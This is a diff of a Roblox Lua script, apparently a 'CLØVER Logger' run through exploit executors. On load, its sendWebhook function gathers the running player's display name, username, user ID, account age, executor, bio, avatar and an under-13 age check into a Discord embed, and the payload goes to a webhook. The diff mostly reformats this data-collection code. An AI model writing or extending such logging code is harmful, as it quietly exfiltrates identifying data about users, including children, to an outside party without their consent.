@@ -247,7 +247,7 @@ local function sendWebhook()
     pcall(function() isUnder13 = player:GetUnder13() end)
     local ageStatus = isUnder13 and "UNDER 13" or "OVER 13"
 
-    -- Roblox bio fetch
+    -- Roblox Bio (description)
     local description = "N/A"
     local success, data = pcall(function()
         return HttpService:JSONDecode(game:HttpGet("https://users.roblox.com/v1/users/" .. userId))
@@ -256,57 +256,33 @@ local function sendWebhook()
         description = data.description
     end
 
-    -- Embed data
+    -- Roblox avatar fetch (updated & fast)
+    local thumbUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=150&height=150&format=png"
+
     local embed = {
         author = {
             name = displayName .. " (" .. username .. ")",
             url = "https://www.roblox.com/users/" .. userId .. "/profile",
-            icon_url = "https://tr.rbxcdn.com/" .. userId .. "-avatar-headshot.png"
+            icon_url = thumbUrl
         },
-        title = "✣ CLØVER ✣",
         description = "**Roblox Bio:**\n" .. (description ~= "N/A" and "> " .. description or "`No bio set.`"),
         color = 0x2f3136,
         thumbnail = {
-            url = "https://tr.rbxcdn.com/" .. userId .. "-avatar.png"
+            url = thumbUrl
         },
         fields = {
-            {
-                name = "Display Name",
-                value = "```"..displayName.."```",
-                inline = true
-            },
-            {
-                name = "Username",
-                value = "```"..username.."```",
-                inline = true
-            },
-            {
-                name = "User ID",
-                value = "```"..userId.."```",
-                inline = true
-            },
-            {
-                name = "Account Age",
-                value = "```"..accountAge.." days```",
-                inline = true
-            },
-            {
-                name = "Executor",
-                value = "```"..executor.."```",
-                inline = true
-            },
-            {
-                name = "Age Check",
-                value = "```"..ageStatus.."```",
-                inline = true
-            }
+            { name = "Display Name",   value = "```" .. displayName .. "```", inline = true },
+            { name = "Username",       value = "```" .. username .. "```", inline = true },
+            { name = "User ID",        value = "```" .. userId .. "```", inline = true },
+            { name = "Account Age",    value = "```" .. accountAge .. " days```", inline = true },
+            { name = "Executor",       value = "```" .. executor .. "```", inline = true },
+            { name = "Age Check",      value = "```" .. ageStatus .. "```", inline = true },
         },
         footer = {
             text = "CLØVER Logger • " .. os.date("%Y/%m/%d %H:%M:%S")
         }
     }
 
-    -- Send to Discord
     local payload = {
         username = "CLØVER Logger",
         embeds = { embed }
@@ -324,6 +300,7 @@ local function sendWebhook()
         })
     end
 end
+
 
 
 sendWebhook()
